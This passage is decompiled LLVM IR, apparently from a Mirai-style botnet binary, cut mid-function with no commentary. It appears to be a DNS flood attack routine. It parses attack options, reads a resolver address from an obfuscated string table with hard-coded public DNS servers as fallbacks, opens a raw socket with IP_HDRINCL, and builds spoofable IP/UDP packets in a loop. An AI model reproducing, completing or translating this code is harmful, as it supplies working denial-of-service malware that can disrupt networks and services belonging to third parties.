  %v0_d7bc = load i32, i32* @sl, align 4
  store i32 %v0_d7bc, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_d7c4 = load i32, i32* @r5, align 4
  store i32 %v0_d7c4, i32* %r0.global-to-local, align 4
  %v5_d7c8 = inttoptr i32 %v0_d7b4 to i32*
  %v6_d7c8 = call i32 @attack_get_opt_int(i32 %v0_d7c4, i32* %v5_d7c8, i32 %v0_d7bc, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_d7d0 = load i32, i32* @sl, align 4
  store i32 %v0_d7d0, i32* %r3.global-to-local, align 4
  %v0_d7d4 = load i32, i32* @r4, align 4
  store i32 %v0_d7d4, i32* %r1.global-to-local, align 4
  %v0_d7dc = load i32, i32* @r5, align 4
  store i32 %v0_d7dc, i32* %r0.global-to-local, align 4
  %v5_d7e0 = inttoptr i32 %v0_d7d4 to i32*
  %v6_d7e0 = call i32 @attack_get_opt_str(i32 %v0_d7dc, i32* %v5_d7e0, i32 8, i32 %v0_d7d0, i32 %v6_d7c8)
  store i32 %v6_d7e0, i32* @r7, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_d7ec = call i32 @table_unlock_val(i32 37)
  %v0_d7f0 = load i32, i32* @sl, align 4
  store i32 %v0_d7f0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v2_d7f8 = inttoptr i32 %v0_d7f0 to i32*
  %v3_d7f8 = call i32 @table_retrieve_val(i32 37, i32* %v2_d7f8)
  store i32 %v3_d7f8, i32* %r0.global-to-local, align 4
  %v0_d7fc = load i32, i32* @sl, align 4
  store i32 %v0_d7fc, i32* %r1.global-to-local, align 4
  %v2_d800 = inttoptr i32 %v0_d7fc to i64*
  %v3_d800 = call i32 @__libc_open(i32 %v3_d7f8, i64* %v2_d800)
  store i32 %v3_d800, i32* @r4, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_d80c = call i32 @table_lock_val(i32 37)
  store i32 %v1_d80c, i32* %r0.global-to-local, align 4
  %v0_d810 = load i32, i32* @r4, align 4
  %v1_d810 = load i32, i32* @sl, align 4
  %v9_d810 = icmp eq i32 %v0_d810, %v1_d810
  store i1 %v9_d810, i1* %cpsr_z.global-to-local, align 1
  %v5_d814 = icmp slt i32 %v0_d810, %v1_d810
  br i1 %v5_d814, label %dec_label_pc_d8d0, label %dec_label_pc_d818

dec_label_pc_d818:                                ; preds = %entry
  %v2_d81c = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_d81c, i32* %sb.global-to-local, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_d81c, i32* @r1, align 4
  store i32 %v0_d810, i32* %r0.global-to-local, align 4
  %v1_d82c = call i32 @__libc_read(i32 %v0_d810)
  store i32 %v1_d82c, i32* @r6, align 4
  %v0_d834 = load i32, i32* @r4, align 4
  store i32 %v0_d834, i32* %r0.global-to-local, align 4
  %v1_d838 = call i32 @__GI___libc_close(i32 %v0_d834)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_d840 = call i32 @table_unlock_val(i32 38)
  %v0_d844 = load i32, i32* @sl, align 4
  store i32 %v0_d844, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v2_d84c = inttoptr i32 %v0_d844 to i32*
  %v3_d84c = call i32 @table_retrieve_val(i32 38, i32* %v2_d84c)
  %v0_d850 = load i32, i32* @r6, align 4
  store i32 %v0_d850, i32* @r1, align 4
  store i32 %v3_d84c, i32* %r2.global-to-local, align 4
  store i32 %v2_d81c, i32* %r0.global-to-local, align 4
  %v3_d85c = bitcast i32* %stack_var_-2124 to i8*
  %v4_d85c = call i32 @util_stristr(i8* %v3_d85c, i32 %v0_d850, i32 %v3_d84c)
  store i32 %v4_d85c, i32* @r8, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_d868 = call i32 @table_lock_val(i32 38)
  store i32 %v1_d868, i32* %r0.global-to-local, align 4
  %v0_d86c = load i32, i32* @r8, align 4
  %v7_d86c = icmp eq i32 %v0_d86c, -1
  store i1 %v7_d86c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d86c, label %dec_label_pc_d8d0, label %dec_label_pc_d874

dec_label_pc_d874:                                ; preds = %dec_label_pc_d818
  %v0_d874 = load i32, i32* @r6, align 4
  %v9_d874 = icmp eq i32 %v0_d874, %v0_d86c
  store i1 %v9_d874, i1* %cpsr_z.global-to-local, align 1
  %v7_d878 = icmp sgt i32 %v0_d874, %v0_d86c
  br i1 %v7_d878, label %dec_label_pc_d87c, label %dec_label_pc_d8d0

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d874
  %v0_d87c = load i32, i32* @sl, align 4
  store i32 %v0_d87c, i32* %r1.global-to-local, align 4
  %v0_d880 = load i32, i32* %sb.global-to-local, align 4
  %v2_d880 = add i32 %v0_d880, %v0_d86c
  store i32 %v2_d880, i32* %ip.global-to-local, align 4
  %v1_d890 = add i32 %v0_d874, -1
  br label %dec_label_pc_d888

dec_label_pc_d888:                                ; preds = %dec_label_pc_d8c4, %dec_label_pc_d87c
  %v0_d8c4 = phi i32 [ %v1_d8c4, %dec_label_pc_d8c4 ], [ %v0_d86c, %dec_label_pc_d87c ]
  %v0_d8ac = phi i32 [ %v0_d8ac27, %dec_label_pc_d8c4 ], [ %v0_d87c, %dec_label_pc_d87c ]
  %v0_d88c = phi i32 [ %v0_d88c23, %dec_label_pc_d8c4 ], [ %v0_d87c, %dec_label_pc_d87c ]
  %v0_d894 = phi i32 [ %v1_d894, %dec_label_pc_d8c4 ], [ %v2_d880, %dec_label_pc_d87c ]
  %v1_d888 = inttoptr i32 %v0_d894 to i8*
  %v2_d888 = load i8, i8* %v1_d888, align 1
  %v3_d888 = zext i8 %v2_d888 to i32
  store i32 %v3_d888, i32* %r0.global-to-local, align 4
  %v2_d88c = icmp eq i32 %v0_d88c, 0
  store i1 %v2_d88c, i1* %cpsr_z.global-to-local, align 1
  %v1_d894 = add i32 %v0_d894, 1
  store i32 %v1_d894, i32* %ip.global-to-local, align 4
  %v1_d898 = add nsw i32 %v3_d888, -48
  store i32 %v1_d898, i32* @lr, align 4
  br i1 %v2_d88c, label %dec_label_pc_d8a0, label %dec_label_pc_d8b0

dec_label_pc_d8a0:                                ; preds = %dec_label_pc_d888
  %v7_d8a0 = icmp eq i8 %v2_d888, 9
  store i1 %v7_d8a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d8a0, label %dec_label_pc_d8c4, label %bb

bb:                                               ; preds = %dec_label_pc_d8a0
  %v8_d8a4 = icmp eq i8 %v2_d888, 32
  store i1 %v8_d8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d8a4, label %dec_label_pc_d8c4, label %dec_label_pc_d8ac

dec_label_pc_d8ac:                                ; preds = %bb
  %v1_d8ac = add i32 %v0_d8ac, 1
  store i32 %v1_d8ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d8b0

dec_label_pc_d8b0:                                ; preds = %dec_label_pc_d888, %dec_label_pc_d8ac
  %v0_d8ac28 = phi i32 [ %v0_d8ac, %dec_label_pc_d888 ], [ %v1_d8ac, %dec_label_pc_d8ac ]
  %v0_d88c24 = phi i32 [ %v0_d88c, %dec_label_pc_d888 ], [ %v1_d8ac, %dec_label_pc_d8ac ]
  %v7_d8b0 = icmp eq i8 %v2_d888, 46
  store i1 %v7_d8b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d8b0, label %dec_label_pc_d8bc, label %bb113

bb113:                                            ; preds = %dec_label_pc_d8b0
  %v3_d8b4 = icmp ugt i32 %v1_d898, 8
  %v8_d8b4 = icmp eq i32 %v1_d898, 9
  store i1 %v8_d8b4, i1* %cpsr_z.global-to-local, align 1
  %v2_d8b8 = xor i1 %v8_d8b4, true
  %v3_d8b8 = and i1 %v3_d8b4, %v2_d8b8
  br i1 %v3_d8b8, label %dec_label_pc_dd24, label %dec_label_pc_d8bc

dec_label_pc_d8bc:                                ; preds = %dec_label_pc_d8b0, %bb113
  %v9_d8bc = icmp eq i32 %v1_d890, %v0_d8c4
  store i1 %v9_d8bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d8bc, label %dec_label_pc_dd24, label %dec_label_pc_d8c4

dec_label_pc_d8c4:                                ; preds = %dec_label_pc_d8a0, %dec_label_pc_d8bc, %bb
  %v0_d8ac27 = phi i32 [ %v0_d8ac, %dec_label_pc_d8a0 ], [ %v0_d8ac28, %dec_label_pc_d8bc ], [ %v0_d8ac, %bb ]
  %v0_d88c23 = phi i32 [ 0, %dec_label_pc_d8a0 ], [ %v0_d88c24, %dec_label_pc_d8bc ], [ 0, %bb ]
  %v1_d8c4 = add i32 %v0_d8c4, 1
  store i32 %v1_d8c4, i32* @r4, align 4
  %v9_d8c8 = icmp eq i32 %v1_d8c4, %v0_d874
  store i1 %v9_d8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d8c8, label %dec_label_pc_d8d0, label %dec_label_pc_d888

dec_label_pc_d8d0:                                ; preds = %dec_label_pc_d8c4, %dec_label_pc_d874, %dec_label_pc_d818, %entry
  %v0_d8d0 = call i32 @rand_next()
  %v1_d8d4 = urem i32 %v0_d8d0, 4
  store i32 %v1_d8d4, i32* %r0.global-to-local, align 4
  %v2_d8d8 = icmp eq i32 %v1_d8d4, 3
  store i1 %v2_d8d8, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_d8d0 to i2
  switch i2 %trunc, label %dec_label_pc_d90410 [
    i2 0, label %dec_label_pc_dd70
    i2 1, label %dec_label_pc_dd84
    i2 -2, label %dec_label_pc_dd60
    i2 -1, label %dec_label_pc_d8f4
  ]

dec_label_pc_d8f4:                                ; preds = %dec_label_pc_d8d0
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_d90410:                              ; preds = %dec_label_pc_d8d0
  unreachable

dec_label_pc_d904:                                ; preds = %dec_label_pc_dd84, %dec_label_pc_dd70, %dec_label_pc_dd60, %dec_label_pc_dd24, %dec_label_pc_d8f4
  %stack_var_-2184.0 = phi i32 [ 33686020, %dec_label_pc_d8f4 ], [ 104859200, %dec_label_pc_dd60 ], [ 707416650, %dec_label_pc_dd84 ], [ 134744072, %dec_label_pc_dd70 ], [ %v1_dd54, %dec_label_pc_dd24 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_d908 = call i32 @__GI_time(i32* null)
  %v0_d90c = load i32, i32* @r7, align 4
  %v2_d90c = icmp eq i32 %v0_d90c, 0
  store i1 %v2_d90c, i1* %cpsr_z.global-to-local, align 1
  %v1_d910 = load i32, i32* @fp, align 4
  %v2_d910 = add i32 %v1_d910, %v2_d908
  store i32 %v2_d910, i32* %r0.global-to-local, align 4
  br i1 %v2_d90c, label %dec_label_pc_dcfc, label %dec_label_pc_d91c

dec_label_pc_d91c:                                ; preds = %dec_label_pc_d904
  store i32 %v0_d90c, i32* %r0.global-to-local, align 4
  %v1_d920 = inttoptr i32 %v0_d90c to i8*
  %v2_d920 = call i32 @util_strlen(i8* %v1_d920)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d934 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_d934, i32* %r0.global-to-local, align 4
  %v7_d938 = icmp eq i32 %v3_d934, -1
  store i1 %v7_d938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d938, label %dec_label_pc_dcfc, label %dec_label_pc_d944

dec_label_pc_d944:                                ; preds = %dec_label_pc_d91c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d94c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d94c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d960 = call i32 @__GI_setsockopt(i32 %v3_d934, i32 0, i32 3, i32 %v6_d94c, i32 4)
  store i32 %v5_d960, i32* %r0.global-to-local, align 4
  %v7_d964 = icmp eq i32 %v5_d960, -1
  store i1 %v7_d964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d964, label %dec_label_pc_dcf4, label %dec_label_pc_d96c

dec_label_pc_d96c:                                ; preds = %dec_label_pc_d944
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v3_d988 = mul i32 %v6_d794, 65536
  store i32 %v3_d988, i32* %sb.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_d998 = urem i32 %v7_d720, 65536
  %v3_d99c = urem i32 %v6_d77c, 65536
  store i32 %v3_d99c, i32* %r0.global-to-local, align 4
  %v3_d9a0 = urem i32 %v6_d794, 65536
  store i32 %v3_d9a0, i32* %r1.global-to-local, align 4
  %v3_d9a4 = urem i32 %v6_d7b0, 65536
  store i32 %v3_d9a4, i32* %r2.global-to-local, align 4
  %v2_d9a8 = icmp eq i32 %arg2, 0
  store i1 %v2_d9a8, i1* %cpsr_z.global-to-local, align 1
  %v1_d9ac = urem i32 %v6_d7c8, 256
  store i32 %v1_d9ac, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d9a8, label %dec_label_pc_dd0c.critedge, label %dec_label_pc_d9c8

dec_label_pc_d9c8:                                ; preds = %dec_label_pc_d96c
  %v3_d97c = mul i32 %v6_d7b0, 65536
  %v2_d9d4 = add i32 %v2_d920, %v1_d9ac
  %v3_d9d8 = mul i32 %v2_d9d4, 65536
  %v1_d9e4 = add i32 %v3_d9d8, 1769472
  %tmp114 = mul nuw nsw i32 %v3_d9a0, 256
  %v3_d9e8 = and i32 %tmp114, 65280
  %v1_d9ec = add i32 %v3_d9d8, 3080192
  %tmp115 = udiv i32 %v6_d794, 256
  %v4_d9fc = urem i32 %tmp115, 256
  %v5_d9fc = or i32 %v3_d9e8, %v4_d9fc
  store i32 %v5_d9fc, i32* @sb, align 4
  store i32 %v3_d97c, i32* %ip.global-to-local, align 4
  %tmp116 = udiv i32 %v1_d9e4, 256
  %v3_da04 = and i32 %tmp116, 65280
  %tmp117 = udiv i32 %v1_d9ec, 256
  %v3_da08 = and i32 %tmp117, 65280
  store i32 %v3_da08, i32* %r2.global-to-local, align 4
  %tmp118 = mul i32 %v6_d7b0, 256
  %v3_da0c = and i32 %tmp118, 65280
  %v4_da10 = udiv i32 %v1_d9e4, 16777216
  %v5_da10 = or i32 %v3_da04, %v4_da10
  store i32 %v5_da10, i32* @fp, align 4
  %tmp119 = mul i32 %v7_d720, 256
  %v3_da18 = and i32 %tmp119, 65280
  store i32 %v3_da18, i32* %r1.global-to-local, align 4
  %v4_da1c = udiv i32 %v1_d9ec, 16777216
  %v5_da1c = or i32 %v3_da08, %v4_da1c
  store i32 %v5_da1c, i32* %r3.global-to-local, align 4
  %tmp120 = udiv i32 %v6_d7b0, 256
  %v4_da20 = urem i32 %tmp120, 256
  %v5_da20 = or i32 %v4_da20, %v3_da0c
  store i32 %v5_da20, i32* @r4, align 4
  store i32 %v2_d920, i32* @lr, align 4
  %tmp121 = udiv i32 %v7_d720, 256
  %v4_da28 = urem i32 %tmp121, 256
  %v5_da28 = or i32 %v4_da28, %v3_da18
  %tmp122 = mul i32 %v6_d77c, 256
  %v3_da2c = and i32 %tmp122, 65280
  store i32 %v3_da2c, i32* %r0.global-to-local, align 4
  %tmp123 = udiv i32 %v6_d77c, 256
  %v4_da3c = urem i32 %tmp123, 256
  %v5_da3c = or i32 %v4_da3c, %v3_da2c
  store i32 %v5_da3c, i32* @r8, align 4
  store i32 0, i32* @r5, align 4
  %v1_da44 = add i32 %v2_d920, 1
  store i32 %v1_da44, i32* @r6, align 4
  %v1_da8c = trunc i32 %v6_d6fc to i8
  %sext = mul i32 %v6_d738, 16777216
  %v4_da90 = sdiv i32 %sext, 16777216
  %sext6 = mul nuw i32 %v5_da1c, 65536
  %v4_da98 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_da28, 65536
  %v4_da9c = sdiv i32 %sext7, 65536
  %sext8 = mul nuw i32 %v5_da20, 65536
  %v4_daf8 = sdiv i32 %sext8, 65536
  %v2_db1c = icmp eq i32 %v2_d920, 0
  %tmp124 = icmp slt i32 %v2_d920, 1
  %v1_daa4 = trunc i32 %v4_da90 to i8
  br label %dec_label_pc_da48

dec_label_pc_da48:                                ; preds = %dec_label_pc_db68, %dec_label_pc_d9c8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_da50 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_da50, i32* %r0.global-to-local, align 4
  store i32 %v2_d6e4, i32* %r1.global-to-local, align 4
  %v3_da58 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_da58, i32* %r3.global-to-local, align 4
  %v2_da5c = load i32, i32* @r5, align 4
  %v5_da5c = mul i32 %v2_da5c, 4
  %v6_da5c = add i32 %v5_da5c, %v2_d6e4
  %v7_da5c = inttoptr i32 %v6_da5c to i32*
  store i32 %v2_da50, i32* %v7_da5c, align 4
  %v0_da60 = load i32, i32* %r1.global-to-local, align 4
  %v1_da60 = load i32, i32* %r3.global-to-local, align 4
  %v4_da60 = mul i32 %v1_da60, 4
  %v5_da60 = add i32 %v4_da60, %v0_da60
  %v6_da60 = inttoptr i32 %v5_da60 to i32*
  %v7_da60 = load i32, i32* %v6_da60, align 4
  store i32 %v7_da60, i32* %r1.global-to-local, align 4
  %v1_da64 = inttoptr i32 %v7_da60 to i8*
  %v2_da64 = load i8, i8* %v1_da64, align 1
  %tmp = urem i8 %v2_da64, 16
  %v1_da68 = zext i8 %tmp to i32
  %v1_da6c = or i32 %v1_da68, 64
  store i32 %v1_da6c, i32* %r2.global-to-local, align 4
  %v1_da70 = trunc i32 %v1_da6c to i8
  store i8 %v1_da70, i8* %v1_da64, align 1
  %v0_da74 = load i32, i32* %r1.global-to-local, align 4
  %v1_da74 = inttoptr i32 %v0_da74 to i8*
  %v2_da74 = load i8, i8* %v1_da74, align 1
  %v1_da78 = and i8 %v2_da74, -16
  %v1_da7c = or i8 %v1_da78, 5
  store i32 %v1_d764, i32* %ip.global-to-local, align 4
  store i8 %v1_da7c, i8* %v1_da74, align 1
  store i32 %v1_d708, i32* %lr.global-to-local, align 4
  %v2_da8c = load i32, i32* %r1.global-to-local, align 4
  %v3_da8c = add i32 %v2_da8c, 1
  %v4_da8c = inttoptr i32 %v3_da8c to i8*
  store i8 %v1_da8c, i8* %v4_da8c, align 1
  store i32 %v4_da90, i32* %r3.global-to-local, align 4
  %v0_da94 = load i32, i32* %ip.global-to-local, align 4
  %v2_da94 = icmp eq i32 %v0_da94, 0
  store i1 %v2_da94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_da98, i32* %r0.global-to-local, align 4
  store i32 %v4_da9c, i32* %r2.global-to-local, align 4
  br i1 %v2_da94, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_da48
  store i32 64, i32* %lr.global-to-local, align 4
  br label %bb126

bb126:                                            ; preds = %dec_label_pc_da48, %bb125
  %v2_daa4 = load i32, i32* %r1.global-to-local, align 4
  %v3_daa4 = add i32 %v2_daa4, 8
  %v4_daa4 = inttoptr i32 %v3_daa4 to i8*
  store i8 %v1_daa4, i8* %v4_daa4, align 1
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_daac = load i32, i32* %r1.global-to-local, align 4
  %v3_daac = add i32 %v2_daac, 9
  %v4_daac = inttoptr i32 %v3_daac to i8*
  store i8 17, i8* %v4_daac, align 1
  %v0_dab0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dab0, label %bb128, label %bb127

bb127:                                            ; preds = %bb126
  %v1_dab0 = load i32, i32* %lr.global-to-local, align 4
  %v2_dab0 = trunc i32 %v1_dab0 to i16
  %v3_dab0 = load i32, i32* %r1.global-to-local, align 4
  %v4_dab0 = add i32 %v3_dab0, 6
  %v5_dab0 = inttoptr i32 %v4_dab0 to i16*
  store i16 %v2_dab0, i16* %v5_dab0, align 2
  br label %bb128

bb128:                                            ; preds = %bb126, %bb127
  store i32 ptrtoint (i32* @global_var_271b8.90 to i32), i32* @lr, align 4
  %v0_dab8 = load i32, i32* %r0.global-to-local, align 4
  %v1_dab8 = trunc i32 %v0_dab8 to i16
  %v2_dab8 = load i32, i32* %r1.global-to-local, align 4
  %v3_dab8 = add i32 %v2_dab8, 2
  %v4_dab8 = inttoptr i32 %v3_dab8 to i16*
  store i16 %v1_dab8, i16* %v4_dab8, align 2
  %v0_dabc = load i32, i32* %r2.global-to-local, align 4
  %v1_dabc = trunc i32 %v0_dabc to i16
  %v2_dabc = load i32, i32* %r1.global-to-local, align 4
  %v3_dabc = add i32 %v2_dabc, 4
  %v4_dabc = inttoptr i32 %v3_dabc to i16*
  store i16 %v1_dabc, i16* %v4_dabc, align 2
  %v2_dac0 = load i32, i32* @global_var_271b8.90, align 4
  store i32 %v2_dac0, i32* %r3.global-to-local, align 4
  %v0_dac4 = load i32, i32* %r1.global-to-local, align 4
  %v1_dac4 = add i32 %v0_dac4, 20
  store i32 %v1_dac4, i32* %r0.global-to-local, align 4
  %v1_dac8 = add i32 %v0_dac4, 41
  store i32 %v1_dac8, i32* %r2.global-to-local, align 4
  %v0_dacc = load i32, i32* @fp, align 4
  %v1_dacc = trunc i32 %v0_dacc to i16
  %v3_dacc = add i32 %v0_dac4, 24
  %v4_dacc = inttoptr i32 %v3_dacc to i16*
  store i16 %v1_dacc, i16* %v4_dacc, align 2
  %v0_dad0 = load i32, i32* @sb, align 4
  %v1_dad0 = trunc i32 %v0_dad0 to i16
  %v2_dad0 = load i32, i32* %r0.global-to-local, align 4
  %v3_dad0 = add i32 %v2_dad0, 2
  %v4_dad0 = inttoptr i32 %v3_dad0 to i16*
  store i16 %v1_dad0, i16* %v4_dad0, align 2
  %v0_dad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_dad4 = add i32 %v0_dad4, 28
  store i32 %v1_dad4, i32* %ip.global-to-local, align 4
  %v0_dad8 = load i32, i32* %r2.global-to-local, align 4
  %v1_dad8 = load i32, i32* @sl, align 4
  %v2_dad8 = add i32 %v1_dad8, %v0_dad8
  store i32 %v2_dad8, i32* @r4, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_dae4 = load i32, i32* @r8, align 4
  %v1_dae4 = trunc i32 %v0_dae4 to i16
  %v3_dae4 = add i32 %v0_dad4, 20
  %v4_dae4 = inttoptr i32 %v3_dae4 to i16*
  store i16 %v1_dae4, i16* %v4_dae4, align 2
  %v0_dae8 = load i32, i32* %r3.global-to-local, align 4
  %v1_dae8 = load i32, i32* %r1.global-to-local, align 4
  %v2_dae8 = add i32 %v1_dae8, 12
  %v3_dae8 = inttoptr i32 %v2_dae8 to i32*
  store i32 %v0_dae8, i32* %v3_dae8, align 4
  %v0_daec = load i32, i32* %r0.global-to-local, align 4
  %v1_daec = trunc i32 %v0_daec to i16
  %v2_daec = load i32, i32* %ip.global-to-local, align 4
  %v3_daec = add i32 %v2_daec, 4
  %v4_daec = inttoptr i32 %v3_daec to i16*
  store i16 %v1_daec, i16* %v4_daec, align 2
  %v0_daf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_daf0 = trunc i32 %v0_daf0 to i16
  %v2_daf0 = load i32, i32* %ip.global-to-local, align 4
  %v3_daf0 = add i32 %v2_daf0, 2
  %v4_daf0 = inttoptr i32 %v3_daf0 to i16*
  store i16 %v1_daf0, i16* %v4_daf0, align 2
  store i32 %stack_var_-2184.0, i32* %r3.global-to-local, align 4
  store i32 %v4_daf8, i32* %ip.global-to-local, align 4
  %v1_dafc = load i32, i32* %r1.global-to-local, align 4
  %v2_dafc = add i32 %v1_dafc, 16
  %v3_dafc = inttoptr i32 %v2_dafc to i32*
  store i32 %stack_var_-2184.0, i32* %v3_dafc, align 4
  %v0_db00 = load i32, i32* %ip.global-to-local, align 4
  %v1_db00 = trunc i32 %v0_db00 to i16
  %v2_db00 = load i32, i32* %r1.global-to-local, align 4
  %v3_db00 = add i32 %v2_db00, 28
  %v4_db00 = inttoptr i32 %v3_db00 to i16*
  store i16 %v1_db00, i16* %v4_db00, align 2
  %v0_db04 = load i32, i32* @sl, align 4
  %v1_db04 = trunc i32 %v0_db04 to i8
  %v2_db04 = load i32, i32* %r1.global-to-local, align 4
  %v3_db04 = add i32 %v2_db04, 40
  %v4_db04 = inttoptr i32 %v3_db04 to i8*
  store i8 %v1_db04, i8* %v4_db04, align 1
  %v0_db08 = load i32, i32* @r4, align 4
  %v1_db08 = add i32 %v0_db08, 1
  store i32 %v1_db08, i32* %r0.global-to-local, align 4
  %v0_db0c = load i32, i32* @r7, align 4
  store i32 %v0_db0c, i32* %r1.global-to-local, align 4
  %v0_db10 = load i32, i32* @r6, align 4
  store i32 %v0_db10, i32* %r2.global-to-local, align 4
  %v3_db14 = call i32 @util_memcpy(i32 %v1_db08, i32 %v0_db0c, i32 %v0_db10)
  store i32 %v3_db14, i32* %r0.global-to-local, align 4
  store i32 %v2_d920, i32* %lr.global-to-local, align 4
  store i1 %v2_db1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp124, label %.dec_label_pc_db68_crit_edge, label %dec_label_pc_db2c

.dec_label_pc_db68_crit_edge:                     ; preds = %bb128
  %v5_db20 = load i32, i32* @r4, align 4
  store i32 %v5_db20, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_db68

dec_label_pc_db2c:                                ; preds = %bb128
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_db30 = load i32, i32* @r4, align 4
  store i32 %v0_db30, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_db38

dec_label_pc_db38:                                ; preds = %.thread21, %dec_label_pc_db2c
  %v1_db40 = phi i32 [ %v1_db4035, %.thread21 ], [ 0, %dec_label_pc_db2c ]
  %v0_db5419 = phi i32 [ %v0_db60, %.thread21 ], [ 0, %dec_label_pc_db2c ]
  %v1_db38 = load i32, i32* @r7, align 4
  %v2_db38 = add i32 %v1_db38, %v0_db5419
  %v3_db38 = inttoptr i32 %v2_db38 to i8*
  %v4_db38 = load i8, i8* %v3_db38, align 1
  %v6_db38 = zext i8 %v4_db38 to i32
  store i32 %v6_db38, i32* %r3.global-to-local, align 4
  %v7_db3c = icmp eq i8 %v4_db38, 46
  store i1 %v7_db3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_db3c, label %bb129, label %bb131

bb129:                                            ; preds = %dec_label_pc_db38
  %v2_db40 = trunc i32 %v1_db40 to i8
  %v3_db40 = load i32, i32* %r0.global-to-local, align 4
  %v4_db40 = inttoptr i32 %v3_db40 to i8*
  store i8 %v2_db40, i8* %v4_db40, align 1
  %v0_db48.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_db44 = load i32, i32* %ip.global-to-local, align 4
  %v1_db44 = add i32 %v0_db44, 1
  store i32 %v1_db44, i32* %r2.global-to-local, align 4
  br i1 %v0_db48.pr, label %bb132, label %bb130

bb130:                                            ; preds = %bb129
  %v2_db4817 = urem i32 %v1_db44, 256
  store i32 %v2_db4817, i32* %ip.global-to-local, align 4
  store i32 %v2_d920, i32* %r2.global-to-local, align 4
  %v0_db54.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_db54 = add i32 %v0_db54.pre, 1
  store i32 %v1_db54, i32* %r1.global-to-local, align 4
  br label %.thread21

bb131:                                            ; preds = %dec_label_pc_db38
  %v1_db4413 = add nsw i32 %v1_db40, 1
  %v2_db48 = urem i32 %v1_db4413, 256
  store i32 %v2_db48, i32* %ip.global-to-local, align 4
  store i32 %v2_d920, i32* %r2.global-to-local, align 4
  %v1_db5420 = add i32 %v0_db5419, 1
  store i32 %v1_db5420, i32* %r1.global-to-local, align 4
  br label %.thread21

bb132:                                            ; preds = %bb129
  store i32 %v2_d920, i32* %r2.global-to-local, align 4
  %v1_db50.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_db50 = load i32, i32* @r4, align 4
  %v3_db50 = add i32 %v2_db50, %v1_db50.pre
  store i32 %v3_db50, i32* %r3.global-to-local, align 4
  %v1_db5465 = add i32 %v1_db50.pre, 1
  store i32 %v1_db5465, i32* %r1.global-to-local, align 4
  %v2_db58 = add i32 %v3_db50, 1
  store i32 %v2_db58, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread21

.thread21:                                        ; preds = %bb131, %bb130, %bb132
  %v0_db60 = phi i32 [ %v1_db54, %bb130 ], [ %v1_db5420, %bb131 ], [ %v1_db5465, %bb132 ]
  %v1_db4035 = phi i32 [ %v2_db4817, %bb130 ], [ %v2_db48, %bb131 ], [ 0, %bb132 ]
  %v9_db60 = icmp eq i32 %v0_db60, %v2_d920
  store i1 %v9_db60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_db60, label %dec_label_pc_db68.loopexit, label %dec_label_pc_db38

dec_label_pc_db68.loopexit:                       ; preds = %.thread21
  %v2_db68.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t71 = trunc i32 %v1_db4035 to i8
  br label %dec_label_pc_db68

dec_label_pc_db68:                                ; preds = %.dec_label_pc_db68_crit_edge, %dec_label_pc_db68.loopexit
  %v0_db68.pre.sink.off0 = phi i8 [ 0, %.dec_label_pc_db68_crit_edge ], [ %extract.t71, %dec_label_pc_db68.loopexit ]
